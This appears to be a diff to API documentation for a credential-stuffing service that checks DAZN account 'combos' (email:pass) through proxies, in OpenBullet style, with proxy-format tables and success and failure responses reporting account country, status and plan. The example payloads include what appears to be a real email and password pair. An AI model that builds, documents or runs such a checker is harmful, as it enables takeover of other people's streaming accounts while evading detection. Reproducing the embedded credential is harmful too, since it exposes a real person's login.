@@ -63,27 +63,44 @@ Echo back email, pass, proxy. Optional `format=hit` returns a built hit line (wi
 
 ### **GET/POST /dazn** (DAZN check)
 
-Check a DAZN combo (email:pass). Uses script (2).loli flow; supports all proxy formats.
+Check a DAZN combo. Uses script (2).loli flow; supports all proxy formats.
 
-**Params:** `hit` (email:pass) or `email` + `pass`, `proxy` (optional).
+**Standard payload:** `api_key`, `email`, `pass`, `proxy` (optional). If `proxy` is missing or empty, the request uses your device (no proxy).
+
+**Params:** `api_key`, `email`, `pass`, `proxy` (optional). Alternatively `hit` (email:pass) instead of email + pass.
 
 **Example GET:**  
 `/dazn?api_key=KEY&hit=email%40mail.com%3Apassword&proxy=ip:port:user:pass`
+
+**Payload (POST body or GET params):** `api_key`, `email`, `pass`, `proxy` (optional). If `proxy` is omitted or empty, the request uses your device (no proxy).
+
+**Example payload (Python-style):**
+```python
+payload = {
+    "api_key": API_KEY,
+    "email": "diezaragong@hotmail.com",
+    "pass": "Germesa1965",
+    "proxy": proxy   # optional; if missing or empty → device (no proxy)
+}
+```
 
 **Example POST body (JSON):**
 ```json
 {
   "api_key": "YOUR_KEY",
-  "hit": "diezaragong@hotmail.com:Germesa1965",
-  "proxy": "ultra.marsproxies.com:44443:user:pass"
+  "email": "diezaragong@hotmail.com",
+  "pass": "Germesa1965",
+  "proxy": "ip:port:user:pass"
 }
 ```
+Leave out `proxy` or use `"proxy": ""` to use device (no proxy).
+
+**`proxy` supports all formats:** `ip:port` | `ip:port:user:pass` | `user:pass@host:port` | `http://host:port` | `http://user:pass@host:port` | `https://...` | `socks4://host:port` | `socks5://user:pass@host:port`
 
 **Response – success (200):**
 ```json
 {
   "success": true,
-  "line": "email:pass | Country = Spain | Status = Active | AutoRenew = false | Plan = ... | Time = 4.94s",
   "data": {
     "country": "Spain",
     "status": "Active",
@@ -102,7 +119,6 @@ Check a DAZN combo (email:pass). Uses script (2).loli flow; supports all proxy f
 ```json
 {
   "success": false,
-  "line": "email:pass | Error = InvalidPassword | Time = 1.02s",
   "error": "InvalidPassword",
   "response": "<full DAZN API response>",
   "time": "1.02s"
@@ -117,16 +133,9 @@ Same as `/dazn`; use when you prefer to send `api_key` in body or header.
 
 **Params:** `api_key` (or `X-API-Key` header), `hit` or `email`+`pass`, `proxy`.
 
-**Example POST body (JSON):**
-```json
-{
-  "api_key": "YOUR_KEY",
-  "hit": "email@example.com:password",
-  "proxy": "ip:port:user:pass"
-}
-```
+**Example POST body (JSON):** Same payload shape as `/dazn` – `api_key`, `email`, `pass`, `proxy` (optional; no proxy = device).
 
-**Response:** Same JSON shape as `/dazn` (success/fail with `line`, `data`/`error`, `time`).
+**Response:** Same JSON shape as `/dazn` (success: `data` + `time`; fail: `error`, `response`, `time`).
 
 ---
 
@@ -149,16 +158,19 @@ Request any URL with browser TLS fingerprint; optional proxy.
 
 ---
 
-## 4. Proxy formats
+## 4. Proxy formats (all supported in payload `proxy`)
 
-All endpoints that take `proxy` accept:
+The `proxy` field in the payload supports every format below. Use any one of them.
 
 | Format | Example |
 |--------|--------|
 | `ip:port` | `1.2.3.4:8080` |
 | `ip:port:user:pass` | `1.2.3.4:8080:user:pass` |
-| `user:pass@host:port` | `user:pass@1.2.3.4:8080` |
+| `user:pass@host:port` | `user:pass@px1260303.pointtoserver.com:10780` |
 | `http://host:port` | `http://1.2.3.4:8080` |
+| `http://user:pass@host:port` | `http://user:pass@1.2.3.4:8080` |
+| `https://user:pass@host:port` | `https://user:pass@proxy.com:443` |
+| `socks4://host:port` | `socks4://1.2.3.4:1080` |
 | `socks5://user:pass@host:port` | `socks5://user:pass@1.2.3.4:1080` |
 
 ---
